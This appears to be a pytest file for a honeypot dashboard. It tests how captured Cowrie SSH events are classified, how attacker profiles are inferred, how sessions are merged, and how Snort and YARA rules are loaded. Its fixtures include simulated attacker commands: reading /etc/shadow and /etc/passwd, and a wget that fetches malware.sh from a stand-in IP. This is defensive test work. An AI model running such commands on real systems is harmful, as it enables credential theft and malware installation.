import pytest

from dashboard.server import (
    bounded_int,
    cancel_active_attack,
    enrich_event,
    enrich_session,
    event_phase,
    merge_attack_session,
    primary_attack_session,
    infer_attacker_profile,
)


def test_bounded_int_clamps_invalid_and_out_of_range_values() -> None:
    assert bounded_int("bad", 1, 10) == 1
    assert bounded_int(0, 1, 10) == 1
    assert bounded_int(25, 1, 10) == 10


def test_cancel_active_attack_requires_a_running_dashboard_scenario() -> None:
    with pytest.raises(ValueError, match="No scenario is currently active"):
        cancel_active_attack()


def test_enrich_event_explains_captured_command() -> None:
    event = enrich_event(
        {"event_type": "cowrie.command.input", "command": "cat /etc/shadow"}
    )
    assert event["event_type"] == "cowrie.command.input"
    assert "password hashes" in event["explanation"]


def test_event_phase_marks_discovery_and_credentials() -> None:
    assert event_phase("cowrie.session.connect") == "discovery"
    assert event_phase("cowrie.login.failed") == "credentials"
    assert event_phase("cowrie.login.success") == "credentials"
    assert event_phase("cowrie.command.input", "cat /etc/shadow") == "bait"


def test_enrich_session_treats_commands_as_successful_access() -> None:
    session = enrich_session(
        {
            "session_id": "session-1",
            "login_success": False,
            "command_count": 2,
            "commands": ["id", "cat /etc/passwd"],
        }
    )
    assert session["attack_type"].startswith("Successful SSH intrusion")


def test_profile_inference_matches_simulator_command_sets() -> None:
    assert infer_attacker_profile(
        {
            "command_count": 5,
            "commands": ["uname -a", "id", "cat /etc/passwd", "ls", "whoami"],
        }
    ) == "scriptkiddie"
    assert infer_attacker_profile(
        {
            "command_count": 11,
            "commands": [
                "cat /etc/shadow",
                "ps aux",
                "netstat -tulnp",
                "wget http://203.0.113.10/malware.sh -O /tmp/m.sh",
            ],
        }
    ) == "opportunist"
    assert infer_attacker_profile(
        {"command_count": 2, "commands": ["crontab -l", "cat /var/log/auth.log"]}
    ) == "targeted"


def test_attack_session_selection_prefers_successful_shell_and_merges_attempts() -> None:
    failed = [
        {"session_id": "failed-1", "login_attempts": 1, "login_success": False, "usernames_tried": ["guest"], "@timestamp": "2026-01-01T00:00:01Z"},
        {"session_id": "failed-2", "login_attempts": 1, "login_success": False, "usernames_tried": ["operator"], "@timestamp": "2026-01-01T00:00:02Z"},
    ]
    successful = {"session_id": "shell", "login_attempts": 1, "login_success": True, "command_count": 4, "usernames_tried": ["deploy"], "@timestamp": "2026-01-01T00:00:03Z"}
    primary = primary_attack_session(failed + [successful])
    assert primary == successful
    merged = merge_attack_session(failed + [successful], primary)
    assert merged["login_attempts"] == 3
    assert merged["login_success"] is True
    assert merged["usernames_tried"] == ["guest", "operator", "deploy"]

    duplicate_shell = dict(successful, session_id="shell-reconnect", login_attempts=1, command_count=0)
    merged_duplicate = merge_attack_session(failed + [successful, duplicate_shell], primary)
    assert merged_duplicate["login_attempts"] == 3


def test_latest_disk_rule_record_reads_files(monkeypatch, tmp_path) -> None:
    from dashboard import server

    monkeypatch.setattr(server, "RULES_DIR", tmp_path)
    session_id = "test-sess-disk"
    date_dir = tmp_path / "2026-05-05"
    date_dir.mkdir(parents=True)
    snort_file = date_dir / f"session_{session_id}.rules"
    yar_file = date_dir / f"session_{session_id}.yar"
    snort_file.write_text('alert tcp any any -> any 22 (msg:"Test rule"; sid:9000001;)\n')
    yar_file.write_text("rule Honeypot_Test { condition: true }\n")

    record = server.latest_disk_rule_record([session_id])
    assert record is not None
    assert record["snort_rules"] == ['alert tcp any any -> any 22 (msg:"Test rule"; sid:9000001;)']
    assert record["yara_rules"] == ["rule Honeypot_Test { condition: true }"]
    assert record["rule_count"] == 2

    assert server.latest_disk_rule_record(["different-session"]) is None
    assert server.latest_disk_rule_record([]) is None
    assert server.latest_disk_rule_record(None) is None


def test_service_management_commands(monkeypatch) -> None:
    from dashboard import server

    recorded_jobs = []

    def fake_launch_job(name: str, cmd: list) -> dict:
        recorded_jobs.append((name, cmd))
        return {"id": "test-job-id", "name": name, "status": "running"}

    monkeypatch.setattr(server, "launch_job", fake_launch_job)

    # Test unknown service validation
    import pytest

    # Verify SERVICE_LABELS covers the expected services
    expected_services = ["cowrie", "elasticsearch", "forwarder", "agent-runner", "action-executor", "kibana"]
    for svc in expected_services:
        assert svc in server.SERVICE_LABELS



